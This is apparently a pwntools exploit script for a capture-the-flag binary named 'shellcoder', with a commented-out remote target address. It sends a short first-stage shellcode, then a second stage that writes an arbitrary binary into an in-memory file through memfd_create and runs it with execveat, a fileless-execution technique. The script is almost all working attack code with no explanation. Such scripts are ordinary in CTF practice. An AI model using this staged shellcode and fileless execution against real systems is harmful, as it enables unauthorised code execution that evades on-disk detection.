from pwn import *

context.aslr=0
r = process(["./shellcoder"])
#r = remote("139.180.215.222", 20002)


context.arch = "amd64"
context.log_level='debug'

gdb.attach(r,'b* 0x15555554a0af')
r.sendafter(":",asm("""
push rdi
pop rsi
xchg edi,edx
syscall
nop
"""))

# syscall(SYS_execveat, exec_fd, "", argv, NULL, AT_EMPTY_PATH);
# int fd=SYS_memfd_create(char  *uname, unsigned int flags)
# int n=SYS_read(0,buf,n)
# int n=SYS_write(fd,buf,n)
# tub_execveat(int fd, char *filename(point to zero),0,0,0x1000)

r.send("\x90"*0x30+asm(shellcraft.pushstr("byzero"))+asm("""
mov rax,319
mov rdi,rsp
mov rsi,0
syscall
mov rbx,rax
loop:
mov rdi,0
mov rsi,rsp
mov rdx,0x400
mov rax,0
syscall
cmp rax,0
je go
mov rdi,rbx
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
jmp loop
go:
mov rdi,rbx
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
"""))


r.recvrepeat(1)
r.send(open("find_flag").read()) # another binary we want to execute
r.shutdown("send")               # close the tube

r.interactive()
